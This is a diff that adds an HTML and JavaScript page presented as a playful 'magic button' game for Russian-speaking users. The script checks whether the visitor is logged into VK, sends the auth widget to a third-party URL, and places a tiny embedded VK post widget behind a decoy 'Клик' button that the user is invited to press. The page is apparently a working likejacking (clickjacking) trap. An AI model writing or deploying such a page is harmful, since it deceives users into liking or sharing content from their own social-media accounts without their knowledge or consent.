@@ -1,0 +1,96 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "https://www.w3.org/TR/html4/strict.dtd">
+<html>
+  <head>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <title>Волшебная кнопка</title>
+    <link rel="stylesheet" href="style.css" />
+  </head>
+
+  <body>
+    <p id="status-text">Загрузка...</p>
+    <div id="main" class="main">
+      <button class="button" id="action-button">Клик</button>
+      <div id="vk_post_486373634_846"></div>
+    </div>
+    <div id="vk_auth"></div>
+    <script
+      type="text/javascript"
+      src="https://vk.com/js/api/openapi.js?173"
+    ></script>
+    <script type="text/javascript">
+      (function () {
+        let isAuthLoading = true;
+        let isAuthSuccess = false;
+        const statusText = document.getElementById("status-text");
+        const fakeButton = document.getElementById("main");
+        const button = document.getElementById("action-button");
+
+        VK.init({
+          apiId: 52818261,
+        });
+
+        const data = VK.Widgets.Auth("vk_auth", {
+          authUrl: "http://inf2.ru/index.php",
+        });
+
+        const iframeAuthMonitor = setInterval(() => {
+          const iframe = document.querySelector("#vk_auth iframe");
+          if (iframe) {
+            // Если iframe загрузился, прекращаем мониторинг
+            iframe.onload = () => {
+              clearInterval(iframeAuthMonitor);
+
+              const iframeContainer = document.querySelector("#vk_auth");
+              const iframeHeight = iframeContainer.clientHeight;
+
+              if (iframeHeight < 145) {
+                statusText.textContent =
+                  "Фокус не сработает :( попробуйте другой браузер или зайдите с компьютера";
+                iframe.style.display = "none";
+                fakeButton.style.display = "none";
+              } else {
+                isAuthSuccess = true;
+              }
+
+              isAuthLoading = false;
+            };
+          }
+        }, 100);
+
+        // Отслеживаем загрузку iframe
+        const iframePostMonitor = setInterval(() => {
+          const iframe = document.querySelector(
+            "#vk_post_486373634_846 iframe"
+          );
+
+          if (!iframe) {
+            // Инициализация виджета в iframe
+            VK.Widgets.Post(
+              "vk_post_486373634_846",
+              486373634,
+              846,
+              "vL296BG5fZmCUmcuiTj9kNBgOmuy",
+              { width: 30 }
+            );
+          }
+
+          if (iframe) {
+            // Если iframe загрузился, прекращаем мониторинг
+            iframe.onload = () => {
+              if (isAuthLoading) return;
+
+              clearInterval(iframePostMonitor);
+
+              if (!isAuthSuccess) return;
+
+              statusText.textContent =
+                "Почувствуй себя фронтендером. \nТебе необходимо покрасить кнопочку одним нажатием :D";
+              button.style.opacity = "1";
+            };
+          }
+        }, 100);
+      })();
+    </script>
+  </body>
+</html>
